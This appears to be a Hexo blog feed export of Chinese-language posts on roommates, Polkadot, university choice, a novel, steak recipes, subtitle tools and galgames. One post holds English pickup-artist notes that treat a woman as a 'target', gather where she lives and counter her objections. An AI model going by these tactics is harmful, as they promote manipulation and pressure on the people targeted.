<li>仁</li>
<li>勇</li>
<li>严</li>
</ul></li>
</ul></li>
<li><p>背景</p>
<p>人们的行为或语言中存在着一些假设或者基于一种共同的认知，典型的就是对好与坏的定义。接下来的一些问题便是与这些潜在假设有关。如果两个人有相似的三观和过去经历，那么两个人便是有所谓的默契。也就是非常容易相互理解。</p>
<ul>
<li>价值观</li>
<li>人生观</li>
<li>爱情观</li>
<li>过去经历
<ul>
<li><p>失恋</p>
<p>可以看出在应激环境下，挫折下，一个人的反应。大学可是会遇到挫折的哦。如果遇上一个碰到挫折，就或暴躁或抑郁几个月的人，祈祷她少碰上一些挫折吧。</p></li>
</ul></li>
</ul></li>
</ul>
<p>建议问题（摘自<em>Big Question：The Brief Introduction to Philosophy</em>)：</p>
<p>​ 与人交流时很少会谈到以下的问题，如果谈到，那就是谈人生了。所以对于这些问题，每个人都会有自己的答案。这些答案根据个人经历，所看的书以及自己的思考所形成。从这些问题中很容易窥探到一个人思考的深度以及信息汲取的深度。</p>
<ul>
<li>梦想（想成为什么样的人，之后想做什么）</li>
<li>生活的意义</li>
<li>上帝（神）</li>
<li>实在的本性（真实）</li>
<li>爱情和性</li>
</ul>
<h2 id="多元化交流方式">多元化交流方式</h2>
<ul>
<li><p>文字聊天</p>
<p>文字聊天传达的信息极为匮乏。很难从中判断一个人的性格。</p></li>
<li><p>语音电话</p></li>
<li><p>视频聊天</p></li>
<li><p>项目合作</p>
<p>可以判断学术能力以及团队合作能力。合作也是对沟通的挑战。如果两个人有没有良好的沟通技能，是很难发现并快速解决问题。</p></li>
<li><p>合作类游戏</p>
<p>在外部压力与刺激下，人下意识的反应以及如何选择。这也是对于默契的培养。</p>
<ul>
<li><a href="http://store.steampowered.com/app/582500/We_Were_Here/">We were here</a>（win与mac版，免费）&amp; <a href="http://store.steampowered.com/app/341800/Keep_Talking_and_Nobody_Explodes/">Keep talking and nobody explodes</a>(win与mac版，68元)
<ul>
<li>解密类游戏</li>
<li>考验良好的沟通技巧（你永远不知道你队友口中描述的东西是什么）</li>
</ul></li>
<li><a href="http://store.steampowered.com/app/448510/Overcooked/">Overcook</a>（win与mac版，57元）
<ul>
<li>手忙脚乱系列</li>
<li>考验领导力以及行动力</li>
<li>一个人是否会在失败紧张下极度的暴躁</li>
</ul></li>
</ul></li>
<li><p>旅游</p>
<p>这个算实践了，和舍友住几天试试，看看合不合适。</p></li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>文章写到这也差不多了。希望在交流和合适的舍友的标准上这两个方向上给读者有所帮助。</p>
<p>我们相信如果你将文中所讲的点全部了解到了，做到了，可能你没有找到合适的舍友，但是必然对你所想了解的人有了更加深刻的认识。</p>
<p>也感谢其他对本文章提出建议的人。</p>
<p>contributor（按照时间排序）：</p>
<ul>
<li>DylaN.B
<hr>
<center>
<img class="lazyload" data-src="/static/images/roomate-gift.jpg" height="50%" width="50%">
</center></li>
</ul>
]]></content>
      <categories>
        <category>人文修养</category>
      </categories>
      <tags>
        <tag>大学</tag>
      </tags>
  </entry>
  <entry>
    <title>Polkadot：今年最有潜力的公链</title>
    <url>/posts/7dd50f2f/</url>
    <content><![CDATA[<p>我最近才知道有<a href="https://polkadot.network/">Polkadot</a>这么一条公链。它的市值排名第八。我知道的的确有点晚了。它的创始人是以太坊的联合创始人。它有 Web3 基金会的支持。如果说在以太坊上开发的是智能合约，Polkadot 上开发的就是区块链。可以自定义的区块链给了开发者更多的自由，我们可以改变它的 Runtime，改变它的共识算法等等。官方也发行了开发工具 Substrate 帮助开发者快速构建自己想要的区块链。Polkadot 这条公链便是基于 Substrate 框架。在 Polkadot 创始人的一次演讲中，他为了展示 Substrate 的易用性，现场 Coding Demo 特意拿出刚刚从苹果店买的 Macbook Pro。现场开箱并使用 Substrate 开发了一条区块链。</p>
<p>说了这么多开发者关心的问题，Polkadot 到底解决了什么问题呢？ 在我看来 Polkadot 解决了并发的问题。因为其独特的 Relay Network, Polkadot 可以并行的处理所有挂在其上面的公链的交易。跨链在 Polkadot 的设计下也变得简单了。数据，资产都可以在不同的链上进行转化。如果用过 Flamingo 等跨链资产工具的人应该知道这些工具有多难用。每次跨链都得调用很多的合约，交不少的手续费。另一个有意思的特性是区块链的升级。这应该算是 Substrate 的特性。由于其将 Runtime 编译成 WASM 放在区块中，区块链的升级不再会导致硬分叉。传统区块链升级需要矿工们升级节点软件版本。如果有些矿工不愿意升级或者忘记升级，这条区块链就会变成两条，也就是硬分叉。</p>
<p>对于挂在 Polkadot 上的链，官方称其为 Parachain。这些 Parachain 既可以是公开的，也可以是私有的。既然 Polkadot 是基于 Substrate 开发的，Parachain 也需要基于 Substrate 开发，那么我们可不可以挂一条 Polkadot 到 Polkadot 上呢？这的确是可行的，我们可以无限套娃。目前官方给出的正在开发的 Parachain 有兼容 EVM 的智能合约区块链，文件存储区块链，身份验证区块链，隐私区块链，金融区块链，IOT 区块链，预言机（Chainlink）等等。这些项目有的看的云里雾里，有的只是把现有的应用拷贝到 Polkadot 上。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>升学</title>
    <url>/posts/45860701/</url>
    <content><![CDATA[<p>又到了升学结束的时候。 <a id="more"></a></p>
<p>我总是对未来充满了期待，尤其是在升学季的时候。对于将要步入的另一个学校充满期望，或许是道听途说，或许是因为一些文学作品，影视作品。总觉得在我将要步入的学校中，我会得到我所想要的，例如知识，漂亮的环境，女朋友。当然，经过我多次升学的经历，这些想法都从未实现过。该是怎么样，还是怎么样。如果自己不做出一些改变，该是怎样的生活还是怎样的生活。我现在正处于对大学非理性的期望当中，觉得那里会碰到新的朋友，好吃的食物，漂亮的风景。说到底，我对大学的期望都是基于其他人对大学美好的印象-一个展示青春活力的地方。未来到底是什么？我还是我，改变的只是环境。我会遇到许多我没面对过的事情，因为环境变了，但并不一定是有趣的。</p>
<p>关于选校的纠结。这个情况跟解忧杂货店中的剧情一样。咨询者去咨询自己的烦恼，寻求一些建议。然而在咨询之前，咨询者，或许不清楚，但是他心中肯定已经有了一个答案。杂货店的回复并不能左右什么。如果建议与咨询者的想法相符，咨询者就会采取想法。如果相违背，那么咨询者就会为自己的想法据理力争。我现在也是这个样子。看了许多评论，每个大学都有自己的优缺点，从理性上非常难进行选择。但是如果不从理性出发，只是单纯靠感觉（不走逻辑），我已经有了选择。由于这个答案并不出自理性，所以这并不一定是一个利益最大化的选择。这时候，我就希望寻求一些他人的建议。我相信，其他人会认真的思考，给我一个理性的答案，（很小一部分的期望）是给我一些理性的论据（一些我并没有查到的信息）。这样做出选择的责任，决心也进行了分摊。其实，我心中早有了答案不是么。加州大学圣塔芭芭拉。</p>
<hr>
<center>
<img class="lazyload" data-src="/static/images/schoolgift.jpg" height="50%" width="50%">
</center>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>三日间的幸福</title>
    <url>/posts/f5a38699/</url>
    <content><![CDATA[<p>就像书的名字一样，三天的幸福。但是足够吗？满足吗？ <a id="more"></a></p>
<p>三日间的幸福绝对不是一本充斥着幸福的书。这是一本压抑的书，在绝望中给你绝望，希望总是在不经意间出现，希望总是那么的平凡。</p>
<p>这本书很容易跟青春年少，意气风发的孩子们产生共鸣。这些孩子在人文主义思想的熏陶下成长，逐渐养成了我-独一无二的信念。这种信念多多少少都有些画地为牢的意味。孩子们抨击其他不符合自己想法的观念。楠木先生就是这样一个人。楠木先生的孤注一掷换来的是孤独，与暗淡无光的人生。幸福究竟在哪里？</p>
<p>这本书的主题便是在绝望中寻找幸福。很奇特的用着些许致郁的剧情传达着治愈。作者的文笔较为细腻，描绘出了不少细节。宫城与楠木先生的点点滴滴，以及他们彼此态度的转变。从一开始的互相戒备，无论是宫城的嘲弄与冷漠还是楠木的拘束与愤怒最终都化为他们生命中的点点滴滴。</p>
<p>本书的情节并没有那种商业电影一波三折的感觉，但是平淡中却透露着惊喜与绝望。照理说这样平淡的结局应该很容易猜到结局，但是呐，还是出人意料啊。不得不提这么本书还有漫画版，但总感觉漫画版少了一份严肃，多了一份娱乐。</p>
<p>作为书的主题之一，死亡就是一切都静止。所以作为一个活着的人，我们应该充分利用自己‘Becoming’的权利。拒绝一沉不变，接纳变化。这个想法倒是和凯文凯利的《Inevitable》有些相似。</p>
<p>世界应该美丽得不可方物,但是楠木因为自己的意气风发而画地为牢，与整个社会格格不入。走投无路的他卖掉了三十年的寿命，仅仅给自己留下了三个月。作为监视者（防止濒死的楠木做出一些过激举动）的宫城小姐还顺带告诉了楠木原来悲惨的人生轨迹。大概这就相当于考完试了，老师把你叫到办公室，展示了你很烂的答卷。老师嘴角挂着嘲笑，开口询问你，你要重考一份难度相同的卷子吗？你所不曾改变的是对高分的期待，正如楠木对幸福的期待一样。但是啊，你只是额外拥有了一次重新站上起跑线的机会。楠木先生坚信这三个月他能活的比原来他三十年的生命更加的精彩。这，可能吗？楠木先生在纸上写下了他死前想要做的事情。宫城只是所在房间的一角，冷漠的像看着物品一样监视着楠木。趁着楠木睡着，悄悄的洗澡。晚上悄悄的睡上一分钟，警觉五分钟。楠木先生在纸上所写的事情代表了对幸福的期待。他认为纸上所写的事情是他生活中最可能会带给他幸福的的事情了。他，错了。随着他与世界的联系一一断开，他陷入了迷茫，愤怒。在被社会所剔除后，道德的约束也随之消散。楠木先生想顺从自己的欲望。但顺从了，就能得到他所期望的幸福吗？他现在与世界唯一那若即若离的联系便是宫城小姐了。或许一无所有，才会想去努力融入社会，去好好看看世界。</p>
<p>楠木先生可是还有一个叫姬野的青梅竹马。姬野家的人戏份真是多呢。我想起了姬野星奏。</p>
<p>其实很简单，怀着一颗热爱生活的心，努力的去接触不同的人，努力的融入群体，至少不要留下形单影只的自己。珍惜眼前每一个景色，每一个人，世界可是美的不可方物啊。</p>
这么想想，我有时候也会画地为牢，抵触一些我反感的东西。我会选择埋头看书，埋头学习。但是呐，这样可不对啊。这个世界的美好一大部分可是来自交互，与人的交互。所以，请多出去走一走，与朋友多玩一玩。书，请放下。在该做什么事情的时候，就请做什么事情。超前的代价可是不小呐，但是落后也是不对的啊。不管怎么样，和朋友们出去玩都不会有尴尬的氛围。因为同龄，本身就是一种共鸣，一种话题，尤其还是青春的年纪。尝试去有一些青春的活力，去感染其他人，去融入青春的世界。这才是应该做的呐。
<hr>
<center>
<img class="lazyload" data-src="/static/images/sanRi-gift.jpg" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>Introduction to Social Dynamic</title>
    <url>/posts/66394fdc/</url>
    <content><![CDATA[<p>a video note about social dynamic <a id="more"></a></p>
<h1 id="the-introduction-to-social-dynamic">The introduction to Social Dynamic</h1>
<h2 id="definition">Definition</h2>
<p>It discusses people's behavior and how to communicate with other's.</p>
<p><strong>The relating term:</strong> cold-read,social engineering, mystery's lounge</p>
<h2 id="video-notes"><a href="https://www.youtube.com/watch?v=w65qBE-5fWg">video notes</a></h2>
<h3 id="opening">opening</h3>
<p>opening（usually last for 2-3 minutes) is not that important, aim to hook(while you see the animate eye) * without hesitate, walk straight to the target before the hesitate appear. * set the framework(a interaction between man and women)- physical * drop down intonation * short phrases * eye contact * you are the doer not the receiver. Control the conversation * vibing: * align your words, behavior(no filters)</p>
<h3 id="interaction">Interaction:</h3>
<ul>
<li>comfort</li>
<li>talk 50% <em>　you are the buyer, not to sell yourself. </em>　stand at the opposite side of her friends(if her friend comes) <em>　emotional investment: </em>　You want to leave?</li>
</ul>
<h3 id="logistic">logistic:</h3>
<ul>
<li>who do you come here with?</li>
<li>where do you go tomorrow?</li>
<li>where do you live?</li>
</ul>
<h3 id="build-leadings">Build leadings :</h3>
<ul>
<li>ask the phone number to see again.(text in front of her;we'll hang in out later; have coffee with me tomorrow)</li>
<li>emotional investment(What is my name?)</li>
</ul>
<h3 id="ending">Ending:</h3>
<ul>
<li>come up with solutions to her objections</li>
</ul>
<h3 id="conclusion">Conclusion:</h3>
<strong>Clear you intent.</strong> Be confident. Be yourself. Be initiative. Show DHV. Don't be afraid of failure.
<hr>
<p><img class="lazyload" data-src="/static/images/social_dynamic-gift.jpg"></p>
]]></content>
      <categories>
        <category>人文修养</category>
      </categories>
      <tags>
        <tag>Social Dynamic</tag>
      </tags>
  </entry>
  <entry>
    <title>Static Site Generator</title>
    <url>/posts/c54975aa/</url>
    <content><![CDATA[<p>今天看了看几个静态网站生成器的区别。 <a id="more"></a></p>
<p>比较常见的静态网站生成器分别是Hexo,Hugo,Gatsby.js,Eleventy。他们各自有着各自的优缺点。其中除了Hugo是go写的，其他都是JS写的。</p>
<p>Hexo是比较常用的用来生成博客的静态网站生成器。它开箱即用，也可以很方便的进行主题和插件的调试及安装，不需要前端的知识。</p>
<p>Hugo最大的特点就是快。但是它只支持主题，并不支持插件。</p>
<p>Gatsby.js是静态网站生成器没错，但是并不是针对博客的。它支持React，因此可以用它来将一些交互复杂的React网站静态化。他并不是开箱即用，需要自己写前段，写模版或者下载现成的模版和插件。</p>
<p>Eleventy.js还没有来到稳定版，它是这几个当中最简洁的生成器。他支持多样的模版文件。但是现在并没有多样的插件，并且并未支持主题。想要用来做博客得自己写模版，写前端。抛开它的简洁性，我为什么不去用Gatsby.js呢。同样是自己配置，但Gatsby好得有React用。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>SSG</tag>
      </tags>
  </entry>
  <entry>
    <title>豪华牛排套餐</title>
    <url>/posts/efd6ad67/</url>
    <content><![CDATA[<p>煎牛排的那些事情 # 牛排 牛排是是一个做起来很快，吃起来也很方便的餐点。烹饪手法主要是三种煎，烤和水浴。通常会把他们结合起来使用。煎是所有组合中必不可少的一步，因为煎牛排可以给牛排带来酥脆的外表以及美拉德反应能让牛排闻起来更香，外表的味道更好。</p>
<p>第一种是纯粹的煎，这种做法的好处是极为的方便。<a href="https://www.youtube.com/watch?v=ShwT6lEd6Y8&amp;list=PL4iRNzIK4UEpkK5s0S8ifDwNTyHtTTowg&amp;index=2&amp;t=0s">视频传送门</a>。在腌制的时候可以加入自己喜欢的调料，比如辣椒粉之类的。可以给牛排烟熏的感觉。</p>
<p>第二种是煎烤的结合，先煎后烤和先烤后煎都有。不过说先烤后煎会更嫩一些。</p>
<p>第三种是水浴和煎。水浴是一种让肉类在中低温的情况下，持续受热的烹饪方式。虽然耗时会长上不少，一般要两个小时不到些，但是肉不会损失很多水份，吃起来会更加多汁。我个人一般会选择一个小时五十分钟，130华氏度。在密封袋中放入牛排和自己喜爱的香料。普通些就是大蒜，橄榄油，迷迭香，或者也可以更加有特色些。可以考虑给牛排刷层酱油或者味噌，吃上去味道会更偏亚洲一些。不过要注意的是味增在高温中很容易糊，水浴完，煎之前，记得把味噌给抹去。</p>
<p>牛排的熟度可以用温度计测量，也可以摸一摸牛排的表面，感受它的硬度。把大拇指和食指捏起来，如果牛排硬度和虎口肌肉差不多，那么是三成熟。大拇指和中指捏起来是五分熟，无名指是七分熟。<a href="https://www.jucanw.com/mszx/mszx/26480.html">图片传送门</a>。</p>
<h1 id="酱料">酱料</h1>
<h3 id="pan-sauce">pan sauce</h3>
<p>最为简单的是pan sauce。也就是借助刚刚煎过牛排的锅做一个最为简单的酱。<a href="https://www.youtube.com/watch?v=Dt3vNIHntJY">视频传送门</a>。 如果是用不粘锅煎的牛排，锅的底部是不会有那些黑黑的的东西的。由于家里没有不锈钢锅，也没法对比一些。我觉得风味上是会差一些的。要注意的是酒和汤不要加的太多，太多就变成了汤了。</p>
<h3 id="奶油蘑菇酱">奶油蘑菇酱</h3>
<p>把打发的奶油，炒过的蘑菇和细韭菜拌在一起。这是我个人比较喜欢的酱，吃起来口感会比较浓厚，还有奶香味。<a href="https://www.youtube.com/watch?v=SpYLA1xtbYQ">视频传送门</a>。</p>
<h3 id="最简单的酱">最简单的酱</h3>
<p>把牛排静置产生的汁水和橄榄油淋在牛排上。其实就是找点汁水充当酱汁而已。</p>
<h3 id="chimichurri-sauce">Chimichurri Sauce</h3>
<p>将各种香料和大蒜捣碎后加入橄榄油形成的酱。有点像意大利青酱的做法，当然材料不同。<a href="https://www.youtube.com/watch?v=xvWrNpkk32Q">视频传送门</a>。</p>
<h1 id="配菜">配菜</h1>
<h3 id="菠菜">菠菜</h3>
<p>西式菠菜做法和中式的做法没有特别大的区别。西式菠菜强调快速，一分钟就可以烧好了。国外的菠菜一般为无土栽培，连根都是没有的。除了炒着吃，菠菜一般还用做沙拉。</p>
<p>材料：菠菜，蒜末。</p>
<p>首先把锅烧热，倒入橄榄油，撒一些盐。烧至滚烫后倒入菠菜。给菠菜顶端洒一些橄榄油。没过一会菠菜会迅速变小。从一锅子变成几勺。在三十秒左右的时候倒入蒜末。再炒几下就可以出锅了。</p>
<p>如果想要再香一些，可以在出锅前加一些明油。吃上去会更香。</p>
<h3 id="芦笋">芦笋</h3>
<p>芦笋先要洗一洗，再把老的部分切了。用刀从尾巴轻轻地往芦笋头部压过去。压不动的都是老的部分。在第一个切的动的地方切下去就可以了。</p>
<p>先把盐，胡椒，柠檬盐（加一些酸味）洒在芦笋上。加一些油，把锅烧到很热后，芦笋下锅。把芦笋的表皮煎香，大约90秒。加入一些黄油，烧大约90秒。过一会加入一勺蔬菜高汤，稀释锅底结块。盖上锅盖，闷2-5分钟即可。</p>
<p>可以用刀检查芦笋的熟度。如果切芦笋的时候非常轻松，那么代表芦笋已经熟了。</p>
<h3 id="蘑菇">蘑菇</h3>
<p>材料：蘑菇，大蒜，洋葱。</p>
<p>可以使用多种蘑菇，这样会更香。</p>
<p>先把整个的大蒜和洋葱末炒香，接着取出大蒜。下蘑菇片。蘑菇的含水量很高，所以一定要大火把蘑菇的水份全部炒干才会香。调味，出锅即可。</p>
<h3 id="土豆泥">土豆泥</h3>
<p>材料：鲜奶油，大蒜，百里香，土豆，香叶，肉桂粉，葱，韭菜。</p>
<p>把土豆切小块撒上盐后加入冷水。把土豆焯熟。把水倒掉之后再加入盐干烧一会，为了把土豆里的水煮掉。接着把土豆用任意工具挤成土豆泥放在盆中备用。</p>
<p>把大蒜，香叶，盐，胡椒，百里香，一点点肉桂粉加入奶油。待奶油烧开后，过一遍滤网，除去香料和大蒜。</p>
<p>边搅拌边将奶油一点点加入土豆泥，将土豆泥调成到自己喜欢的粘稠度后加入葱末。这样就做好了。</p>
<p>记得在吃之前可以撒上细韭菜末和橄榄油。</p>
<h3 id="煎土豆">煎土豆</h3>
<p>未完待续。。</p>
]]></content>
      <categories>
        <category>Cook</category>
      </categories>
      <tags>
        <tag>Cook</tag>
      </tags>
  </entry>
  <entry>
    <title>自动化制作字幕</title>
    <url>/posts/291d2d4a/</url>
    <content><![CDATA[<p>做文本翻译是一件繁琐的事情，需要大量的时间和精力。我曾经做过几个礼拜的文本翻译。面对着长长的游戏文本和各种俗语，往往一两个小时也写不了多少。如果用机器进行翻译，虽然快速，但那个质量惨不忍睹。机翻生活在汉化的最低端，虽然快捷但是正确率地下，不少句子也十分拗口。当看见一个不是那么称心如意的汉化，往往有观众猜测它为机翻。</p>
<p>之后随着机器学习的进步，机器翻译随之变成可能。记得搜狗同传作为同声翻译的辅助频繁出现在各个会场。那么有没有可能让字幕的制作在机器学习的帮助下变得快捷起来同时质量也没有那么差呢？</p>
<p>自动翻译字幕，其实是两部分。一是翻译语音，二是翻译视频中的文字。当音频中有噪声出现，人声不够清晰时，视频中大多会出现内嵌字幕。这就是翻译视频中文字的主要用途。当音频不靠谱时，我们用识别视频中的文字来补足。</p>
<h2 id="音频">音频</h2>
<p>音频部分我使用的是<a href="https://github.com/agermanidis/Autosub">Autosub</a>。这是一个比较简陋的python库。简陋在作者已经半年没有更新了，一些严重的bug也没有修。其中一个bug导致了此脚本在windows无法运行。<a href="https://github.com/raryelcostasouza/pyTranscriber">pyTranscriber</a>是Autosub的一个fork。在Autosub的基础上，pyTranscriber添加了图形界面，修复了之前提到的严重bug，还提供了二进制安装包。这对于字幕翻译人员可谓是友善至极，毕竟他们不一定是一个开发者。他们不一定知道如何使用pip安装Autosub，如何在命令行使用Autosub。</p>
<p>Autosub的原理是把视频的语音部分给剥离出来，使用google的云服务进行语音转文字。如果需要翻译的话，会将转化出来的文字再次使用google的翻译服务。最后输出为srt格式。</p>
<p>使用翻译功能需要自己开通google的翻译api并取得api key。语音转文字的api key使用的是chromium中存在的一个公用api key。</p>
<p>我个人试了两种视频。一种是人声非常清楚，几乎没有背景声。在这种情况下，语音识别基本不会错。翻译的问题也不大。第二种视频是那种背景噪音很大，人声很小，有字幕辅助的视频。在这个视频中，语音识别的效率比较差，明显和内嵌字幕有较大的差距。</p>
<h2 id="视频">视频</h2>
<p>视频部分使用的是<a href="https://github.com/apm1467/videocr">videoOcr</a>。它所做的就是把视频切成图片，再对图片进行图像识别。将文字提取出来并输出str文件。</p>
<p>VideoOcr都不能作为一个程序，它只是一个库。想要处理视频，还需要自己写脚本来调用这个库中的方法。想要处理其他语言，需要将语言编码传入。然而语言编码具体是什么得自己查，不像之前的Autosub可以罗列出所有的语言。并且它的语言编码有的和Autosub就不一样。比如日语一个是jap，一个是ja。当自己写的脚本跑起来以后，发现这个库在处理视频是命令行没有任何关于进度的输出。要不是看见cpu近乎爆表，我都以为它卡死了。</p>
<p>我个人试了一个视频。这个视频比较特殊，它有台标，有一直存在右上角的横幅字幕用来显示章节，而且字幕带有一点艺术字的感觉。识别的效果不是特别好，所有东西都是一股脑的输出，而且没有一个是准确的。就连一直不变的台标也是有的正确有的错误。VideoOcr使用的是tesseract，不知道是不是因为它对日文的支持不好。我尝试直接使用tesseract对视频截图进行识别，效果非常之差。为了对比，我是用google lens进行文字识别。发现google lens的效果远好于tesseract。或许尝试找一个支持google文字识别的工具可以提高准确率。</p>
<p>还有一个跟VideoOcr类似的是<a href="https://github.com/HenryLulu/video-to-text-ocr-demo">Video to text Ocr Demo</a>。它支持把一直不变的台标去掉。由于它用的是百度云，而我又没办法验证我之前百度云账号的手机号，也就没有成功使用。</p>
<p>总得来说我对音频部分十分满意，对于视频部分倒是觉得差的不少。但是对于常规的字幕来说，音频才是信息的主要来源。Autosub应该可以作为初翻使用。在翻译的时候也不用一遍遍的去看视频，看着识别出来的原文本即可。相信可以省下不少时间。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Subtitle</tag>
      </tags>
  </entry>
  <entry>
    <title>Sugarfull Tempering(糖调)</title>
    <url>/posts/32e0bd78/</url>
    <content><![CDATA[<p>来自Recette 的萌豚向galgame：しゅがてん！-sugarfull tempering-(译名为糖调)成为了我第一款打通的galgame。 <a id="more"></a></p>
<h1 id="x01">0x01</h1>
<p>我一直很想认真的打通一款galgame,静下心去阅读一个故事，然后写下一篇读后感。很久很久以前，我花了三四个小时打了悠之空-缘之空的续作。它只给我留下了画风很好的印象。后来我加入了缘之空贴吧的官方群，我还没说几句话，QQ便提示我“由于该群违规，群已经解散”。</p>
<p>关于糖调这款游戏我是在<a href="https://plumz.me">李先生</a>的一篇介绍<a href="https://plumz.me/archives/7648/">2017Gal</a>的博文上看到的：“这是一款给萌豚玩的童话故事”。我不是一个萌豚，并且不喜欢废萌。我一向很讨厌读没有内涵，全程灌水，剧情俗套弱智的故事。但是我还是吃下了这个安利。糖调的画风看上去真的很棒诶。童话也是吸引我的一个因素，或许是时候放松一下，看一个温柔，温暖的故事。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring1.png"></p>
<h1 id="x02">0x02</h1>
<p>糖调属于那种没什么剧情的卖萌游戏，就像<strong>请问您今天要来点兔子吗?</strong>。不得不提糖调这款游戏就是由しらたま画的。她画过很多优秀的<strong>请问您今天要来点兔子吗</strong>同人本。糖调的故事发生在一个北欧小镇的甜品店里。甜品，萝莉，日常。是不是听上去就像糖白开？再加上一些妖精的传说，一个甜甜的童话就新鲜出炉了。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring2.png"></p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring3.png"></p>
<p>那来简单说说这个关于妖精的童话吧。在这个常年飘雪的小镇，有一种神奇的气候叫妖精之夜（见下图）。传说在这个晚上许下的愿望也会被实现。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring4.png"> <em>重点是背景，不是萝莉</em></p>
<p>就在妖精之夜，男主从天而降。活泼开朗的芽瑠-甜品店店主的孙女，安静的冰织收留了从天而降失忆的男主。还有经常来光顾甜品店的外国人巧克拉。由于甜品店店主，唯一的西点师-芽瑠的爷爷住院，甜品店进入了长期歇业的状态。男主希望报答一下收留自己的恩情，便自告奋勇的开始制作甜品。然而男主意外的有做甜品的天赋，做出来的甜品非常好吃。甜品店便重新开业了。</p>
<p>在这期间，芽瑠和冰织也帮助男主寻找失去的记忆。的唯一的线索就是那张印有在男主口袋中，印有山田九郎的名片。还有便是爱罗似乎认识男主，但是她并不愿透露什么。</p>
<p>在共同线中，一共会出现四个选择，然而这四个选择对于剧情<strong>毫无影响</strong>。</p>
<p>最后便是直接选择个人线。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring5.png"></p>
<p>每一条个人线都有一个到两个事件，并且都有妖精作为了线索。硬要说的话，冰织线加上TE是一个完整的故事，紧扣着妖精之夜，和男主的身份。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring6.png"></p>
<p>那么男主到底是谁呢，是谁和萝莉一起**又不犯法呢？答案，游戏在一开始就告诉了你。山田九郎，这个名字有没有像某个英文单词，某个喜欢爬上屋顶，给人带来幸福的人？</p>
<p>巧克拉正披着男主的衣服，有没有一点眼熟呢？</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring7.png"></p>
<h1 id="x03">0x03</h1>
<p>花了十二个小时打通这个萌豚喝茶的游戏，看着萌豚喝茶，每天早上出门必然看到小町在扫雪，天天解救屋顶上的巧克拉，小町每天下午都要到店里来纠结吃什么甜品。就是这样甜甜的日常让我我对废萌游戏有了一个新的印象：虽然我不能在故事中领会到什么高深的立意，但是一杯甜甜暖暖的糖白开喝下去，心中会有一种温暖，温柔的感觉。窗外飞着雪花，游戏里也下着雪，温暖甜蜜的日常段子的流过心间。游戏里萝莉们天天一到两次的下午茶，<strong>我现在也好想吃甜点！</strong></p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring8.png"></p>
<p>游戏中我最喜欢的是冰织。她有我不怎么见到的小坎肩，我现在都没看出来怎么编出来的辫子加上星空色的眼睛。しらたま真会画萝莉~~</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring9.png"></p>
<p>冰织安静，悠然，坚强，不愿给其他人添麻烦的性格给我留下了很深的印象。她可以敏锐的洞察别人的小心思，但是并不会点破。她默默的制造着妖精之夜，沉浸在过去裾野阿姨流产的自责中。还有那吃甜品吃醉后撒娇的反差萌，都令我印象深刻。</p>
<p>我很高兴能够看到男主把冰织带出自责与愧疚。</p>
<blockquote>
<p>“...... 冰雪酱，这就是妖精之夜。 啊呜 .... 虽然有点冷，不过很棒吧。 在身体变冷之前，一定要看好噢。 ...... 这就是妖精之夜，在这个镇里大量存在的 最美的东西。 是给姐姐. 带来最美好幸福的. 奇迹。”</p>
</blockquote>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring10.png"></p>
<p>CV的表现非常的出色。最棒的便是冰织的CV杏子御津。声音毫无违和感，还传达着一种安静的感觉。</p>
<p>游戏的歌曲名字都包含着甜点的名字，甜甜的气息扑面而来。</p>
<p>唯一让我觉得有些缺陷的是进入个人线后，女主就变得突然羞涩起来。每天都是在患得患失中度过，天天在思考自己是不是喜欢上男主了。跟男主话都没法好好讲了。有点类似网络小说中常犯的一个缺陷。女主或者开朗或者安静，一旦男主出现，女主就疯狂倒贴男主。之前一切的设定都崩了。女主天天都是倒贴男主，不再拥有个性。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring11.png"></p>
<p>在打完这么一个<strong>萌豚喝茶</strong>的游戏，我没忍住看了一集<strong>请问您今天要来点兔子吗？</strong>。里面最令我喜欢的竟是ED出现的扑克牌。卡背有点像单车的卡背。</p>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring12.png"></p>
<hr>
<p><img class="lazyload" data-src="/static/images/sugarfull-tempring-gift.png"></p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
        <tag>糖调</tag>
      </tags>
  </entry>
  <entry>
    <title>游魂2：you are the only one</title>
    <url>/posts/772c3bce/</url>
    <content><![CDATA[<p>奇了怪了，这游戏我开头打的挺嗨的。进入个人线，就不想玩了。趴~ <a id="more"></a></p>
<h2 id="游戏简介">游戏简介</h2>
这是一款Galgame。游戏发生在游魂初代50年后的鹰千帆市。在这个世界中有一种奇特的生物叫<strong>太转依</strong>。
<center>
<img class="lazyload" data-src="/static/images/tayutama-1.png" height="80%" width="80%">
</center>
<p>太转依耗费一定的神气可以化身为人。那么太转依应该怎么和人类相处呢？（这问题有点像人与自然的相处之道）在这个社会有两种不同的看法：人与太转依一起生活，和谐共处；太转依和人类各自过各自的生活，互不干涉。由于人类占主导地位，所以在人和太转依和谐共处的方案下，肯定是太转依去适应人类的生活。男主角草壁空和其他人的故事就发生在这儿-鹰千帆市矢古民町-一个试行太转依和人类和谐共存的镇子。</p>
